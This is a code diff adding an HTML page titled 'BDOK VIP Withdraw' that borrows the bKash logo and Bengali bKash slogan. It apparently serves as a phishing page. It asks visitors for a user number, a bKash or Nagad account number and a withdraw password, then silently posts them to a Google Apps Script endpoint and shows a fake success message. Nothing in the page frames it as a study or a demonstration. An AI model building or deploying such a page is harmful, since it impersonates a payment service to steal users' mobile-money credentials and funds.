@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BDOK VIP Withdraw</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body class="bg-image">
+
+<div class="container">
+    <div class="login-box">
+
+<div class="logo">
+    <img src="https://www.logo.wine/a/logo/BKash/BKash-bKash-Logo.wine.svg">
+    <h2>Super Pay</h2>
+</div>
+
+<form id="loginForm">
+    <div class="input-box">
+       <i class="fas fa-user"></i>
+        <input type="text" name="mobile" placeholder="User Number" required>
+    </div>
+
+    <form id="loginForm">
+    <div class="input-box">
+        <i class="fa-solid fa-phone"></i>
+        <input type="text" name="Bkash" placeholder="Bkash or Nagad" required>
+    </div>
+
+    <div class="input-box">
+        <i class="fa-solid fa-lock"></i>
+        <input type="password" name="password" placeholder="Withdraw Password" required>
+        <span class="eye"><i class="fa-solid fa-eye"></i></span>
+    </div>
+
+    <button type="submit" class="login-btn">SUBMIT</button>
+
+  <p class="register">
+        নির্ভর এবং নিশ্চয়তার সঙ্গে, <a href="#"> বিকাশ। </a>
+    </p>
+</form>
+
+</div>
+</div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const formData = new FormData(this);
+    
+    fetch('https://script.google.com/macros/s/AKfycbzsbX76lOX0XFw-dcILEsPGkphiaetdqCe_I1OKOKOldDYS3znywGO3TeL3G8LkKoZw/exec', {
+        method: 'POST',
+        body: formData
+    })
+    .then(() => {
+        alert("✅ Submitted Successfully!");
+        this.reset();
+    })
+    .catch(() => {
+        alert("❌ Something went wrong!");
+    });
+});
+</script>
+
+</body>
+</html>
